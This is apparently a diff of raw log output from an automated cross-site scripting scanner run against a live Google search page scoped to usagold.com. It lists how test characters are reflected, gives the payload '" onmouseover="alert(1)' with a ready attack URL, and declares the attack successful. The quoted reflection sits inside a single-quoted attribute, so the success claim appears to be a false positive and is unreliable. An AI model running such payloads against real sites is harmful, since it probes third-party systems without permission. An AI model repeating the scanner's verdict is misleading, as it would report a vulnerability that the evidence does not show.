href\x3d\x22/search?q\x3d(uvw%22xyz%27yxz%3C/zxy+site:usagold.com\x26amp;source\x3dlnt\x26amp;tbs\x3dli:1\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQpwV6BAgBEB4\x22\x3eVerbatim\x3c/a\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3c/div\x3e');})();(function(){google.drty&&google.drty();})();});</script>
+
+----------------------------------------------------------------------------------
+URI Context: [12]
+<a href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:usagold.com&amp;gbv=1&amp;sei=kH6UXp_OF4ic4-EP8_uOsAs">
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fsitesearch%3Dusagold.com%26q%3D(uvw%2522xyz%27yxz%253C/zxy" target="_top">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:usagold.com&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQ_AUoAXoECAEQAw">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:usagold.com&amp;source=lnms&amp;tbm=vid&amp;sa=X&amp;ved=2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQ_AUoAnoECAEQBA">
+<a class="q qs" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:usagold.com&amp;source=lnms&amp;tbm=nws&amp;sa=X&amp;ved=2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQ_AUoA3oECAEQBQ">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:usagold.com&amp;source=lnms&amp;tbm=bks&amp;sa=X&amp;ved=2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQ_AUoAHoECAEQBw">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=(uvw%22xyz%27yxz%3C/zxy+site:usagold.com&amp;source=lnms&amp;tbm=fin&amp;sa=X&amp;ved=2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQ_AUoAXoECAEQCA">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?sitesearch%3Dusagold.com%26q%3D(uvw%2522xyz%2527yxz%253C/zxy" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQo_oBegQIARAK">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?sitesearch%3Dusagold.com%26q%3D(uvw%2522xyz%2527yxz%253C/zxy#languages" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQo_oBegQIARAL">
+<a class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/setprefs?safeui=on&amp;sig=0_lM5ubWzohHhHGim8tE4iodMiS5A%3D&amp;prev=https://www.google.com/search?sitesearch%3Dusagold.com%26q%3D(uvw%2522xyz%2527yxz%253C/zxy" id="safesearch" data-ved="2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQo_oBegQIARAM">
+<a href="/advanced_search?q=(uvw%22xyz'yxz%3C/zxy+site:usagold.com&amp;hl=en" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwif1trB1eXoAhUIzjgGHfO9A7YQo_oBegQIARAN">
+<meta content="0;url=/search?q=(uvw%22xyz%27yxz%3C/zxy+site:usagold.com&amp;gbv=1&amp;sei=kH6UXp_OF4ic4-EP8_uOsAs" http-equiv="refresh">
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	False	True	True	False
+
+Attack Payloads for ATTR
+['" onmouseover="alert(1)']
+
+ATTR Attack Url: https://www.google.com/search?sitesearch=usagold.com&q=" onmouseover="alert(1)
+
+=> ATTACK SUCCESSFUL with Payload: " onmouseover="alert(1)
+Detection of Payload: 
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value='" onmouseover="alert(1) site:usagold.com' aria-label="Search" data-ved="0ahUKEwj1xNHD1eXoAhUTyDgGHSG3DHoQ39UDCAk">
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	True
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	False	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+SCRIPT:		True	True	True	True	False
+
+Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
